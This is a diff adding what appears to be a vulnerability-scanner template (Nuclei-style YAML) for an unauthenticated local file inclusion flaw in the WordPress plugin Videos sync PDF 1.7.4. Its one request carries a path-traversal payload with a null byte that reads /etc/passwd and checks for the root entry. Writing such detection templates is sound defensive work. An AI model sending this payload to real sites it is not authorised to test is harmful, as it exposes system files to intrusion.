@@ -1,0 +1,21 @@
+id: video-synchro-pdf-lfi
+info:
+  author: Hassan Khan Yusufzai - Splint3r7
+  name: Videos sync PDF 1.7.4 - Unauthenticated Local File Inclusion
+  reference:
+  - https://www.exploit-db.com/exploits/50844
+  - https://wordpress.org/plugins/video-synchro-pdf/
+  severity: high
+  tags: wordpress,wp-plugin,lfi,wp
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=../../../../../../../../../etc/passwd%00'
